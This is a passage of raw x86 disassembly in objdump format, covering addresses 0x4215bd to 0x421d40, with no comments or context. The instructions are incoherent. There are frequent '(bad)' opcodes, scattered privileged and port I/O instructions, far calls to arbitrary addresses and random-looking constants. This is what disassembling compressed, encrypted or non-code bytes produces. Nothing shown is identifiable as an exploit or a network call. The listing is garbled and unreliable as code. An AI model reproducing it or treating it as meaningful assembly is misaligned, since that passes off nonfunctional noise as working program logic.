  4215bd:	mov    BYTE PTR [edx],bl
  4215bf:	lods   eax,DWORD PTR ds:[esi]
  4215c0:	arpl   WORD PTR [edi],si
  4215c2:	xor    eax,0x6f58f500
  4215c7:	cmp    ecx,DWORD PTR [edx+0x586e562d]
  4215cd:	or     edi,edx
  4215cf:	xchg   ebp,eax
  4215d0:	cli    
  4215d1:	das    
  4215d2:	fwait
  4215d3:	pop    eax
  4215d4:	mov    esi,DWORD PTR [ebx+0x7cd973ac]
  4215da:	adc    ebp,ecx
  4215dc:	xor    bh,BYTE PTR [ecx-0x5f]
  4215df:	int3   
  4215e0:	mov    gs,WORD PTR [ebx-0x3358c053]
  4215e6:	jne    0x4215be
  4215e8:	hlt    
  4215e9:	dec    ecx
  4215ea:	and    eax,ebp
  4215ec:	cld    
  4215ed:	sub    eax,0xe6f2260a
  4215f2:	cmc    
  4215f3:	test   edi,edx
  4215f5:	(bad)  
  4215f7:	xor    al,0x49
  4215f9:	sar    ecx,0xac
  4215fc:	shl    DWORD PTR [ebx+0x442199d3],1
  421602:	popa   
  421603:	cld    
  421604:	add    DWORD PTR [edx-0x66],esp
  421607:	push   ss
  421608:	in     al,dx
  421609:	jmp    0x421648
  42160b:	sub    esp,DWORD PTR [ebx+0x0]
  42160e:	in     al,0x7e
  421610:	js     0x421606
  421612:	daa    
  421613:	sahf   
  421614:	mov    ch,0xa0
  421616:	xchg   esi,eax
  421617:	push   ss
  421618:	or     cl,BYTE PTR [edi-0x53]
  42161b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42161c:	xor    esi,0x6c
  42161f:	int3   
  421620:	push   edx
  421621:	jne    0x421629
  421623:	test   DWORD PTR [ecx+ebx*2+0x36c180f0],esp
  42162a:	fwait
  42162b:	mov    ch,BYTE PTR [ebx-0x32]
  42162e:	adc    ch,BYTE PTR [ebp-0x15]
  421631:	jg     0x42162b
  421633:	call   0x7b33c9e2
  421638:	test   eax,0xb86ef907
  42163d:	(bad)  
  42163e:	clc    
  42163f:	clc    
  421640:	data16 in al,dx
  421642:	pop    ecx
  421643:	ds stos DWORD PTR es:[edi],eax
  421645:	adc    eax,0x97ded20d
  42164a:	ins    BYTE PTR es:[edi],dx
  42164b:	pop    ss
  42164c:	fist   DWORD PTR [edi]
  42164e:	jnp    0x421695
  421650:	daa    
  421651:	inc    ecx
  421652:	inc    ebx
  421653:	xchg   edx,eax
  421654:	mov    BYTE PTR [ecx-0x2feb3d77],bl
  42165a:	(bad)  
  42165c:	test   eax,0xe66ee294
  421661:	dec    edi
  421662:	add    ch,BYTE PTR [esi+ebp*2]
  421665:	xchg   ecx,eax
  421666:	idiv   DWORD PTR [ecx+ebx*2+0x7c3a9222]
  42166d:	aas    
  42166e:	mov    WORD PTR [ebx],cs
  421670:	or     BYTE PTR [edi-0x4c63f752],0x3b
  421677:	es jnp 0x42167e
  42167a:	or     DWORD PTR ds:0x1b17ec09,0xd38b7956
  421684:	adc    al,0x9f
  421686:	jl     0x421680
  421688:	shl    DWORD PTR [edx+0x51],1
  42168b:	pop    es
  42168c:	mov    cl,BYTE PTR [eax]
  42168e:	addr16 inc eax
  421690:	stos   BYTE PTR es:[edi],al
  421691:	sub    esp,esp
  421693:	lds    eax,FWORD PTR [ecx+0x52496d93]
  421699:	ins    BYTE PTR es:[edi],dx
  42169a:	into   
  42169b:	and    BYTE PTR [edx-0x8],dh
  42169e:	dec    eax
  42169f:	sbb    DWORD PTR [ebx+0x55789e11],0x7b92e0b
  4216a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216aa:	dec    esi
  4216ab:	add    esi,DWORD PTR [esi+edi*4-0x69]
  4216af:	mov    ds:0xfbeb0dda,eax
  4216b4:	fnstsw WORD PTR [ebx+eax*8]
  4216b7:	push   0x42
  4216b9:	ret    0x760a
  4216bc:	jnp    0x4216e2
  4216be:	retf   0x7161
  4216c1:	(bad)  
  4216c2:	stc    
  4216c3:	cmp    al,0x8f
  4216c5:	pop    es
  4216c6:	mov    esi,0xb7ed88fa
  4216cb:	jno    0x421703
  4216cd:	xor    al,0xe8
  4216cf:	es call 0x61cd:0x2a437ced
  4216d7:	out    0x95,al
  4216d9:	fwait
  4216da:	add    bh,BYTE PTR [edx]
  4216dc:	int    0xce
  4216de:	xchg   al,bh
  4216e0:	lea    edi,[edx-0x6e]
  4216e3:	xor    BYTE PTR [eax-0x44],bh
  4216e6:	loopne 0x42174d
  4216e8:	mov    ch,0x8f
  4216ea:	add    ch,BYTE PTR [ecx-0x18]
  4216ed:	pop    ss
  4216ee:	sbb    DWORD PTR [ebx-0x24ecf895],esi
  4216f4:	adc    BYTE PTR [edx],ch
  4216f6:	shl    edx,cl
  4216f8:	push   ds
  4216f9:	call   0xa1842edd
  4216fe:	mov    WORD PTR [ecx-0x51],fs
  421701:	ds pusha 
  421703:	push   esp
  421704:	mov    ebp,0x66769d46
  421709:	fsubr  QWORD PTR [edi+0x13]
  42170c:	pushf  
  42170d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170e:	call   0x7f0e8ce5
  421713:	or     eax,0xcb422cde
  421718:	and    dl,BYTE PTR [ebp-0x2cf4437c]
  42171e:	lds    esp,FWORD PTR [eax-0x3fc62e06]
  421724:	ins    BYTE PTR es:[edi],dx
  421725:	ret    
  421726:	or     DWORD PTR [ebx],esi
  421728:	out    dx,eax
  421729:	nop
  42172a:	push   ds
  42172b:	cmp    eax,0xb1fc53a
  421730:	inc    ebp
  421731:	push   ds
  421732:	stos   BYTE PTR es:[edi],al
  421733:	cmc    
  421734:	and    cl,BYTE PTR [eax+eiz*4]
  421737:	mov    esp,0x7be3c551
  42173c:	(bad)  
  42173d:	push   cs
  42173e:	and    DWORD PTR [eax],esi
  421740:	(bad)  
  421742:	(bad)  
  421743:	popf   
  421744:	ficom  DWORD PTR [esi+0x6b6f263e]
  42174a:	push   cs
  42174b:	aad    0x62
  42174d:	inc    esi
  42174e:	xlat   BYTE PTR ds:[ebx]
  42174f:	inc    esi
  421750:	or     al,0xfb
  421752:	mov    cl,0x74
  421754:	cmp    eax,0xb77f9eed
  421759:	mov    edi,0x3dd5757a
  42175e:	ins    DWORD PTR es:[edi],dx
  42175f:	push   ebp
  421760:	adc    eax,0xb93888d
  421765:	ret    0xd0e3
  421768:	inc    esp
  421769:	push   0xffffffb5
  42176b:	jmp    0xbe47d98e
  421770:	cmp    al,0x16
  421772:	mov    ah,BYTE PTR [eax]
  421774:	pop    esp
  421775:	pop    edi
  421776:	out    0xd,al
  421778:	(bad)  
  421779:	std    
  42177a:	mov    ah,0xb4
  42177c:	and    ebp,DWORD PTR [eax+0x50]
  42177f:	lahf   
  421780:	sbb    bh,BYTE PTR [ecx+esi*1-0x2e]
  421784:	adc    al,0x5d
  421786:	das    
  421787:	cs mov al,0x47
  42178a:	or     eax,0xf5e7c147
  42178f:	dec    eax
  421790:	mov    bl,0xcd
  421792:	adc    eax,0xb6b27ac
  421797:	dec    eax
  421798:	imul   ebp
  42179a:	push   es
  42179b:	mov    ah,0xc9
  42179d:	xor    cl,BYTE PTR [eax]
  42179f:	xchg   ebp,eax
  4217a0:	and    ah,al
  4217a2:	adc    ebx,esp
  4217a4:	jp     0x421814
  4217a6:	xchg   ecx,eax
  4217a7:	gs lahf 
  4217a9:	lea    esp,[esi+eiz*4+0x7f45d76f]
  4217b0:	pop    ss
  4217b1:	aaa    
  4217b2:	retf   
  4217b3:	mov    dl,0x9a
  4217b5:	pop    ebx
  4217b6:	aad    0x98
  4217b8:	mov    ebp,0x65162748
  4217bd:	pop    ss
  4217be:	xchg   DWORD PTR [ebx+esi*2+0x22ce6f92],edx
  4217c5:	leave  
  4217c6:	mov    ds:0x521a4d8c,al
  4217cb:	test   ch,bh
  4217cd:	dec    esp
  4217ce:	mov    edx,0xc382ba78
  4217d3:	pop    esi
  4217d4:	mov    ebp,0xcf275996
  4217d9:	cmp    al,0x6a
  4217db:	xor    eax,0xf06ce450
  4217e0:	mov    ebp,fs
  4217e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217e3:	les    ebx,FWORD PTR [eax-0x66c66dd5]
  4217e9:	pop    ebp
  4217ea:	repnz mov BYTE PTR [edi-0x675ec2f0],ah
  4217f1:	cmp    esp,DWORD PTR [ebp+esi*4-0x66]
  4217f5:	xchg   esp,eax
  4217f6:	cwde   
  4217f7:	push   esp
  4217f8:	leave  
  4217f9:	xchg   DWORD PTR [eax],eax
  4217fb:	sub    ah,BYTE PTR es:[ecx]
  4217fe:	mov    cl,BYTE PTR [edi+0x22d06717]
  421804:	jbe    0x421857
  421806:	mov    cs:0x69151ec2,eax
  42180c:	push   ebx
  42180d:	aas    
  42180e:	mov    ds:0xa624f862,eax
  421813:	xchg   edi,eax
  421814:	icebp  
  421815:	jl     0x4217c7
  421817:	push   es
  421818:	inc    ebx
  421819:	arpl   WORD PTR [eax],di
  42181b:	pop    esi
  42181c:	sti    
  42181d:	jge    0x42181c
  42181f:	mov    cl,0xd6
  421821:	(bad)  
  421822:	mov    dh,0x7f
  421824:	mov    ds:0x5298d914,eax
  421829:	pop    ss
  42182a:	sbb    eax,0x32e1bc9f
  42182f:	mov    al,ds:0xb2167fc3
  421834:	mov    ah,0x80
  421836:	mov    ebp,0xff07fe7b
  42183b:	push   ebp
  42183c:	pop    es
  42183d:	not    DWORD PTR [ebp-0x7f06f7b4]
  421843:	adc    DWORD PTR [edi+0x7f9dafa9],esi
  421849:	push   0x5ab18dd9
  42184e:	inc    esi
  42184f:	or     BYTE PTR [ebx+0x3a27d8aa],0xa6
  421856:	test   BYTE PTR [ebx+0x4f6c9297],al
  42185c:	bound  esi,QWORD PTR ss:[esp+eiz*8]
  421860:	push   ss
  421861:	xor    esi,ebp
  421863:	inc    edi
  421864:	ror    BYTE PTR [ebx+esi*1+0x32],1
  421868:	icebp  
  421869:	dec    eax
  42186a:	test   al,0xe9
  42186c:	aad    0x12
  42186e:	mov    ah,0x6b
  421870:	push   cs
  421871:	(bad)  
  421872:	aam    0xdc
  421874:	lds    ecx,FWORD PTR [eax]
  421876:	pop    esi
  421877:	xor    eax,esi
  421879:	adc    dl,BYTE PTR [edx-0x681ecb1f]
  42187f:	retf   
  421880:	push   esp
  421881:	sub    bl,BYTE PTR [eax+0x61]
  421884:	cmp    bh,BYTE PTR [ecx-0x4d]
  421887:	fisub  DWORD PTR [ecx]
  421889:	dec    eax
  42188a:	mov    ds:0x1ee04d81,al
  42188f:	call   0xb269:0x960987bd
  421896:	out    dx,al
  421897:	pop    ebx
  421898:	and    al,0x9a
  42189a:	daa    
  42189b:	jle    0x421865
  42189d:	inc    edi
  42189e:	jne    0x421825
  4218a0:	int    0x8e
  4218a2:	jmp    0xe6ed7f76
  4218a7:	jge    0x42189f
  4218a9:	(bad)  
  4218aa:	cmp    BYTE PTR [eax+0x9],dh
  4218ad:	(bad)  
  4218ae:	out    0x5b,al
  4218b0:	cwde   
  4218b1:	fsubp  st(3),st
  4218b3:	popa   
  4218b4:	xor    al,0x95
  4218b6:	call   0xb4dfe20f
  4218bb:	dec    ecx
  4218bc:	pop    ebp
  4218bd:	lea    ecx,[esi]
  4218bf:	cmc    
  4218c0:	pop    ebp
  4218c1:	mov    al,ds:0x59db38d3
  4218c6:	mov    eax,0xc8d59ca7
  4218cb:	pop    ecx
  4218cc:	and    al,0x76
  4218ce:	inc    ebp
  4218cf:	push   ds
  4218d0:	stos   BYTE PTR es:[edi],al
  4218d1:	jl     0x4218c3
  4218d3:	pop    esp
  4218d4:	pop    edi
  4218d5:	sub    al,0xc8
  4218d7:	jle    0x421887
  4218d9:	jo     0x4218c1
  4218db:	bound  esi,QWORD PTR [esi]
  4218dd:	cmp    DWORD PTR ds:0xfafd15d4,edi
  4218e3:	adc    al,BYTE PTR ds:0xeac5875b
  4218e9:	arpl   WORD PTR [esp+esi*8],ax
  4218ec:	mov    esp,0x52211280
  4218f1:	xchg   ebp,eax
  4218f2:	gs inc edx
  4218f4:	lahf   
  4218f5:	dec    ebx
  4218f6:	add    BYTE PTR [ebp+0x3b],ch
  4218f9:	pusha  
  4218fa:	lds    ecx,FWORD PTR [eax]
  4218fc:	dec    esi
  4218fd:	add    bl,bl
  4218ff:	test   BYTE PTR [eax+eiz*1-0x433bbf7d],dl
  421906:	lods   al,BYTE PTR ds:[esi]
  421907:	shl    BYTE PTR [esi+0x5],1
  42190a:	ins    DWORD PTR es:[edi],dx
  42190b:	(bad)  
  42190c:	icebp  
  42190d:	out    0xd4,eax
  42190f:	je     0x4218fc
  421911:	jmp    0x1fd4ed2d
  421916:	mov    DWORD PTR [edi],ecx
  421918:	cmc    
  421919:	xchg   BYTE PTR [eax+ebx*8],bh
  42191c:	fadd   DWORD PTR [edx]
  42191e:	lahf   
  42191f:	jns    0x421979
  421921:	jns    0x4218c7
  421923:	sahf   
  421924:	xlat   BYTE PTR ds:[ebx]
  421925:	(bad)  
  421926:	cmp    eax,DWORD PTR [edi+0x5c53fc4d]
  42192c:	outs   dx,BYTE PTR cs:[esi]
  42192e:	fisttp QWORD PTR [edi]
  421930:	gs mov dl,0xdc
  421933:	aam    0x34
  421935:	jmp    0x4218b9
  421937:	ins    DWORD PTR es:[edi],dx
  421938:	les    edi,FWORD PTR ds:[edi]
  42193b:	lods   eax,DWORD PTR ds:[esi]
  42193c:	(bad)  
  42193e:	adc    bl,BYTE PTR [esi+0x69739b9a]
  421944:	(bad)  
  421945:	or     eax,0x3cfd1331
  42194a:	popa   
  42194b:	(bad)  
  42194c:	jo     0x421998
  42194e:	push   0xffffffa5
  421950:	mov    eax,0xde081264
  421955:	in     eax,0x5a
  421957:	cmp    ebp,ebp
  421959:	pop    ebp
  42195a:	jmp    0x4219d4
  42195c:	cdq    
  42195d:	xchg   edx,eax
  42195e:	(bad)  
  42195f:	sbb    cl,BYTE PTR [esi+0x73]
  421962:	inc    bh
  421964:	inc    DWORD PTR [ecx+edx*1+0x5b]
  421968:	jno    0x421939
  42196a:	cmp    ah,bl
  42196c:	jl     0x4219c3
  42196e:	pop    ss
  42196f:	sub    BYTE PTR [edx],dh
  421971:	rcr    BYTE PTR [eax-0x79],0x55
  421975:	dec    esp
  421976:	sbb    al,0x5
  421978:	mov    ebx,0x88f529cf
  42197d:	in     eax,0x52
  42197f:	xchg   BYTE PTR [edi-0x440b8668],dh
  421985:	xchg   ebp,ebx
  421987:	cmp    dl,ah
  421989:	mov    bl,0x39
  42198b:	sahf   
  42198c:	bound  ecx,QWORD PTR [esi-0x5dc0db94]
  421992:	push   0x80feb17e
  421997:	sub    bh,BYTE PTR [ecx]
  421999:	jne    0x4219af
  42199b:	pop    ds
  42199c:	mov    bh,0xab
  42199e:	pushf  
  42199f:	cmp    DWORD PTR ds:0x72303a8d,0xffffff9e
  4219a6:	mov    ds:0x3c251977,al
  4219ab:	jo     0x421962
  4219ad:	pop    ds
  4219ae:	rcl    ah,1
  4219b0:	dec    eax
  4219b1:	(bad)  
  4219b2:	out    0x9d,eax
  4219b4:	fcmovnb st,st(4)
  4219b6:	adc    DWORD PTR [eax-0x32],eax
  4219b9:	inc    edi
  4219ba:	jl     0x4219f5
  4219bc:	inc    eax
  4219bd:	cld    
  4219be:	pop    es
  4219bf:	jg     0x421a36
  4219c1:	popf   
  4219c2:	(bad)  
  4219c3:	mov    bh,0xe2
  4219c5:	cwde   
  4219c6:	mov    esp,0x6d9ee214
  4219cb:	pop    es
  4219cc:	or     BYTE PTR [esp+ebp*1],ch
  4219cf:	int    0xde
  4219d1:	int    0xbe
  4219d3:	sbb    dl,BYTE PTR [ebx-0xc11eff5]
  4219d9:	cmp    cl,0xe7
  4219dc:	xchg   esp,eax
  4219dd:	cli    
  4219de:	ret    0xe920
  4219e1:	push   ebx
  4219e2:	xchg   edi,eax
  4219e3:	push   cs
  4219e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219e5:	and    ch,BYTE PTR [ebx]
  4219e7:	jp     0x4219d7
  4219e9:	(bad)  
  4219eb:	and    eax,0xefa4f9da
  4219f0:	and    esp,esp
  4219f2:	pop    ecx
  4219f3:	xchg   ecx,eax
  4219f4:	push   cs
  4219f5:	sub    BYTE PTR [eax-0x34],dl
  4219f8:	mov    ds:0xc41e5d96,al
  4219fd:	cwde   
  4219fe:	aaa    
  4219ff:	xchg   ebx,edi
  421a01:	adc    eax,0x980b3104
  421a06:	sbb    BYTE PTR [ebp-0x48800936],cl
  421a0c:	inc    ebx
  421a0d:	add    ch,BYTE PTR [eax]
  421a0f:	or     BYTE PTR [eax-0x10],dh
  421a12:	inc    edx
  421a13:	loop   0x421a35
  421a15:	cmp    DWORD PTR [ecx-0x1a],ecx
  421a18:	sub    DWORD PTR [ecx+0x4],edx
  421a1b:	sub    DWORD PTR [ecx],0xeee965ee
  421a21:	arpl   WORD PTR cs:[ebp-0x2c],cx
  421a25:	adc    BYTE PTR [eax],0xe7
  421a28:	dec    edi
  421a29:	aaa    
  421a2a:	push   ss
  421a2b:	unpckhps xmm1,XMMWORD PTR [esi-0x76aeff3a]
  421a32:	test   DWORD PTR [edi],eax
  421a34:	mov    cl,0x29
  421a36:	stc    
  421a37:	dec    eax
  421a38:	cmc    
  421a39:	push   esp
  421a3a:	(bad)  [edx+0x7b]
  421a3d:	fstp   st(7)
  421a3f:	call   0xca2e:0xa6a94a3c
  421a46:	call   0x18521481
  421a4b:	(bad)  
  421a4c:	das    
  421a4d:	adc    BYTE PTR [eax+0x7d4d704],bh
  421a53:	aam    0x55
  421a55:	scas   al,BYTE PTR es:[edi]
  421a56:	mov    al,ds:0x926e7cc5
  421a5b:	mov    cl,BYTE PTR [esi+0x2]
  421a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a5f:	nop
  421a60:	fnstcw WORD PTR [ecx-0x45]
  421a63:	popf   
  421a64:	cmp    al,0x50
  421a66:	shr    BYTE PTR [edx],1
  421a68:	jb     0x421a7e
  421a6a:	hlt    
  421a6b:	in     al,0x4d
  421a6d:	and    BYTE PTR [edi],dh
  421a6f:	pop    ebx
  421a70:	jp     0x421a5c
  421a72:	push   edi
  421a73:	in     al,0x1a
  421a75:	add    BYTE PTR [ebp+0x38],ah
  421a78:	arpl   WORD PTR [ebp-0x65],ax
  421a7b:	xchg   esp,eax
  421a7c:	cmp    cl,BYTE PTR [esi-0xf]
  421a7f:	pop    es
  421a80:	pop    ds
  421a81:	lock inc edi
  421a83:	sbb    al,0xa9
  421a85:	scas   al,BYTE PTR es:[edi]
  421a86:	fwait
  421a87:	sub    BYTE PTR [edi-0x3e],al
  421a8a:	sti    
  421a8b:	(bad)  
  421a8c:	sub    esi,DWORD PTR [esi]
  421a8e:	daa    
  421a8f:	call   0x9bf1fd2a
  421a94:	je     0x421a42
  421a96:	pop    edi
  421a97:	xor    dh,BYTE PTR [eax+0x2e]
  421a9a:	mov    esi,ebx
  421a9c:	pop    ecx
  421a9d:	lods   al,BYTE PTR ds:[esi]
  421a9e:	add    eax,0x9ee683c7
  421aa3:	mov    eax,ds:0x48b719b7
  421aa8:	shl    BYTE PTR [esi-0x5],1
  421aab:	mov    bh,0x27
  421aad:	or     BYTE PTR [ebx],ah
  421aaf:	(bad)  
  421ab0:	pusha  
  421ab1:	mov    dh,0x6e
  421ab3:	in     eax,0x4c
  421ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ab6:	js     0x421a41
  421ab8:	popf   
  421ab9:	sahf   
  421aba:	int3   
  421abb:	ins    BYTE PTR es:[edi],dx
  421abc:	(bad)  
  421abd:	fld    DWORD PTR [esi]
  421abf:	jns    0x421aee
  421ac1:	push   edx
  421ac2:	jno    0x421a48
  421ac4:	jle    0x421ada
  421ac6:	stc    
  421ac7:	out    dx,al
  421ac8:	mov    ch,0xf3
  421aca:	sbb    eax,0x65255b90
  421acf:	lahf   
  421ad0:	sar    BYTE PTR [eax+0x57aa9655],1
  421ad6:	mov    al,0x93
  421ad8:	int3   
  421ad9:	inc    ebx
  421ada:	call   0x4ea6552d
  421adf:	mov    ch,0x2b
  421ae1:	repz fidivr DWORD PTR [bx-0x796f]
  421ae7:	retf   0x40f
  421aea:	dec    ecx
  421aeb:	call   0x3fd08a64
  421af0:	fstp   DWORD PTR [edi]
  421af2:	jno    0x421a8f
  421af4:	jnp    0x421b6d
  421af6:	leave  
  421af7:	mov    eax,ds:0x9946b03e
  421afc:	or     BYTE PTR [edi-0x4189a68a],dl
  421b02:	or     eax,0x348f41ca
  421b07:	fld    QWORD PTR [ecx]
  421b09:	jecxz  0x421aa1
  421b0b:	fidiv  DWORD PTR [ebx]
  421b0d:	lahf   
  421b0e:	sar    BYTE PTR [ecx+0x8],0xb2
  421b12:	push   ebp
  421b13:	mov    eax,ds:0x8e88f20f
  421b18:	mov    ?,WORD PTR [ebx+0x44]
  421b1b:	pop    esi
  421b1c:	pop    edi
  421b1d:	or     dl,BYTE PTR [ebx+0x2448e843]
  421b23:	mov    al,ds:0xe929a909
  421b28:	test   al,0x62
  421b2a:	push   0x3c
  421b2c:	repnz frstor [ebp-0x35906130]
  421b33:	adc    al,0xfd
  421b35:	jo     0x421ac0
  421b37:	sbb    edi,DWORD PTR [ebx+0x69]
  421b3a:	in     al,0x1d
  421b3c:	jle    0x421b2a
  421b3e:	lods   al,BYTE PTR ds:[esi]
  421b3f:	cmp    BYTE PTR [esi-0x52],0xe0
  421b43:	lods   eax,DWORD PTR ds:[esi]
  421b44:	adc    DWORD PTR [ecx-0x55],ecx
  421b47:	call   0xca57:0x62dda7e5
  421b4e:	sti    
  421b4f:	mov    dh,0x79
  421b51:	lahf   
  421b52:	xchg   esp,eax
  421b53:	cmp    DWORD PTR [edx],esp
  421b55:	fst    QWORD PTR [edi-0x49]
  421b58:	jmp    0x421b74
  421b5a:	sti    
  421b5b:	dec    ebp
  421b5c:	daa    
  421b5d:	or     dh,BYTE PTR [edx]
  421b5f:	out    dx,al
  421b60:	add    ch,bh
  421b62:	jp     0x421bdc
  421b64:	pusha  
  421b65:	out    dx,al
  421b66:	fcmovnb st,st(6)
  421b68:	mov    es,WORD PTR ss:[ebx]
  421b6b:	mov    cl,0xa2
  421b6d:	dec    ecx
  421b6e:	cli    
  421b6f:	popa   
  421b70:	popa   
  421b71:	icebp  
  421b72:	pop    es
  421b73:	rol    DWORD PTR [ebx],0x79
  421b76:	adc    eax,0xebaca3ef
  421b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b7c:	mov    ds:0x6de73df5,al
  421b81:	pop    ss
  421b82:	xor    al,0xe4
  421b85:	rol    DWORD PTR [esi-0x60],cl
  421b88:	test   al,0x4
  421b8a:	sbb    cl,ah
  421b8c:	gs in  eax,0x54
  421b8f:	cmp    ah,ch
  421b91:	sbb    bl,bh
  421b93:	lods   al,BYTE PTR ds:[esi]
  421b94:	inc    ecx
  421b95:	or     ebx,DWORD PTR [edi+ecx*1]
  421b98:	ins    DWORD PTR es:[edi],dx
  421b99:	xor    eax,0xd8f75e9b
  421b9e:	outs   dx,DWORD PTR ds:[esi]
  421b9f:	or     DWORD PTR [ebx],esi
  421ba1:	in     eax,0xe6
  421ba3:	scas   al,BYTE PTR es:[edi]
  421ba4:	and    ch,bh
  421ba6:	mov    ds:0x86742b43,eax
  421bab:	out    dx,al
  421bac:	retf   
  421bad:	rol    BYTE PTR [edi+0x73f3f39d],1
  421bb3:	call   0x8ba73fe0
  421bb8:	or     cl,cl
  421bba:	call   0xd04efc83
  421bbf:	push   ds
  421bc0:	and    bl,BYTE PTR [ebp-0x7e]
  421bc3:	mov    DWORD PTR [edi+0x6d3c4c06],eax
  421bc9:	mov    eax,ds:0xe10e564d
  421bce:	inc    esi
  421bcf:	push   ebx
  421bd0:	fwait
  421bd1:	inc    ebp
  421bd2:	scas   al,BYTE PTR es:[edi]
  421bd3:	(bad)  
  421bd4:	ja     0x421b6e
  421bd6:	sbb    ah,ch
  421bd8:	dec    ebp
  421bd9:	nop
  421bda:	pop    ebx
  421bdb:	stos   BYTE PTR es:[edi],al
  421bdc:	sub    ebx,DWORD PTR [edi-0x2c]
  421bdf:	fisubr DWORD PTR [ecx]
  421be1:	icebp  
  421be2:	imul   ebp,DWORD PTR ds:0xa6c4b016,0x1809d203
  421bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bed:	xchg   esi,eax
  421bee:	ret    0xfec9
  421bf1:	mov    ecx,0xcb4abba7
  421bf6:	push   es
  421bf7:	(bad)  
  421bf8:	out    0x58,ax
  421bfb:	add    DWORD PTR [edx],esp
  421bfd:	clc    
  421bfe:	push   0x37
  421c00:	jae    0x421c4e
  421c02:	sub    BYTE PTR [edx-0x44ed53f9],0x9c
  421c09:	xchg   esi,eax
  421c0a:	xlat   BYTE PTR ds:[ebx]
  421c0b:	jmp    0x421c2c
  421c0d:	lods   eax,DWORD PTR ds:[esi]
  421c0e:	loopne 0x421c44
  421c10:	mov    ecx,0x249f7098
  421c15:	sbb    DWORD PTR [ecx+0x4577b3b7],esi
  421c1b:	cmp    BYTE PTR [esi+0x3fd2bc60],0x59
  421c22:	and    edi,DWORD PTR [eax]
  421c24:	adc    al,0x48
  421c26:	xchg   esp,eax
  421c27:	jno    0x421c2d
  421c29:	xchg   ecx,eax
  421c2a:	leave  
  421c2b:	xchg   edx,eax
  421c2c:	je     0x421be2
  421c2e:	cmp    DWORD PTR [eax],esi
  421c30:	shl    BYTE PTR [esi+0x8dd9b8],0x5e
  421c37:	add    DWORD PTR [eax+ebp*2],0x6af1b15
  421c3e:	inc    edx
  421c3f:	jge    0x421c51
  421c41:	jae    0x421c99
  421c43:	mov    ch,0x1a
  421c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c46:	sub    edi,DWORD PTR [edx]
  421c48:	jb     0x421cb9
  421c4a:	jecxz  0x421c7a
  421c4c:	mov    ch,0x4f
  421c4e:	inc    ecx
  421c4f:	add    BYTE PTR [eax+0x5ec83187],ch
  421c55:	sub    BYTE PTR [edx-0x2581fb63],dh
  421c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c5c:	xor    ah,BYTE PTR [ebp-0x57]
  421c5f:	push   esp
  421c60:	xor    esi,DWORD PTR [eax+edi*2-0x604a55fa]
  421c67:	mov    ebp,0x919c1baa
  421c6c:	ins    DWORD PTR es:[edi],dx
  421c6d:	repnz cmp eax,0x2068ee8b
  421c73:	sub    al,0x5b
  421c75:	dec    ebp
  421c76:	ins    DWORD PTR es:[edi],dx
  421c77:	jb     0x421c6d
  421c79:	lea    esi,[eax]
  421c7b:	xchg   ecx,eax
  421c7c:	pop    ebp
  421c7d:	mov    bl,BYTE PTR [ebx]
  421c7f:	pushf  
  421c80:	cmp    al,0x6f
  421c82:	and    BYTE PTR [edx-0x24670cbe],0xdf
  421c89:	adc    ah,BYTE PTR [esi+0x6a2db279]
  421c8f:	xor    al,0x7a
  421c91:	cmp    BYTE PTR [esi+0x4a7f2d03],bl
  421c97:	ins    DWORD PTR es:[edi],dx
  421c98:	and    BYTE PTR [esi+edi*4],0x5b
  421c9c:	shr    BYTE PTR [ecx+0x6ee863e8],0xa0
  421ca3:	mov    eax,0x194bafab
  421ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ca9:	sub    DWORD PTR [edx-0x33],edx
  421cac:	inc    esp
  421cad:	or     DWORD PTR [ecx],edx
  421caf:	int3   
  421cb0:	cwde   
  421cb1:	jae    0x421ce7
  421cb3:	xor    ecx,DWORD PTR [ecx-0x9b5dc9a]
  421cb9:	and    BYTE PTR [ebp+0x243524eb],ah
  421cbf:	pop    ds
  421cc0:	fld    TBYTE PTR [edx+0x65]
  421cc3:	cmp    DWORD PTR [ecx],eax
  421cc5:	in     al,dx
  421cc6:	push   esi
  421cc7:	adc    bh,bh
  421cc9:	lods   al,BYTE PTR ds:[esi]
  421cca:	shl    DWORD PTR [edi+0x1bb77f2a],1
  421cd0:	push   ss
  421cd1:	cmp    BYTE PTR [esi],0x65
  421cd4:	out    0x66,al
  421cd6:	mov    DWORD PTR [ecx],eax
  421cd8:	jns    0x421c63
  421cda:	imul   edx,DWORD PTR [edx],0xbfa07a34
  421ce0:	inc    esi
  421ce1:	out    dx,al
  421ce2:	lds    ebx,FWORD PTR [ebx+ecx*8]
  421ce5:	push   edi
  421ce6:	lahf   
  421ce7:	imul   esp,DWORD PTR [esi+0x5f74880e],0x3845e180
  421cf1:	xchg   BYTE PTR [edx+0x79132936],dl
  421cf7:	jecxz  0x421c8c
  421cf9:	jae    0x421d13
  421cfb:	scas   al,BYTE PTR es:[edi]
  421cfc:	mov    edi,0xe41616ec
  421d01:	inc    ebx
  421d02:	(bad)  
  421d03:	js     0x421cda
  421d05:	int    0x25
  421d07:	(bad)  
  421d08:	out    dx,al
  421d09:	pop    esp
  421d0a:	mov    al,0xea
  421d0c:	ss pop ds
  421d0e:	sahf   
  421d0f:	nop
  421d10:	mov    edi,0x211e5949
  421d15:	out    dx,al
  421d16:	sub    esp,0xcbc1f4fe
  421d1c:	leave  
  421d1d:	or     al,0xd3
  421d1f:	mov    ebx,0xb68f713f
  421d24:	sti    
  421d25:	lods   eax,DWORD PTR ds:[esi]
  421d26:	mov    bl,0xfe
  421d28:	xchg   BYTE PTR [ebx],ch
  421d2a:	inc    edi
  421d2b:	imul   edi,ebx,0x99ade353
  421d31:	or     dh,BYTE PTR [ecx+0x68]
  421d34:	adc    al,0x47
  421d36:	jecxz  0x421d41
  421d38:	cmp    dh,BYTE PTR [eax-0x21]
  421d3b:	cmc    
  421d3c:	pop    eax
  421d3d:	xchg   ecx,eax
  421d3e:	adc    edi,esp
  421d40:	cli    
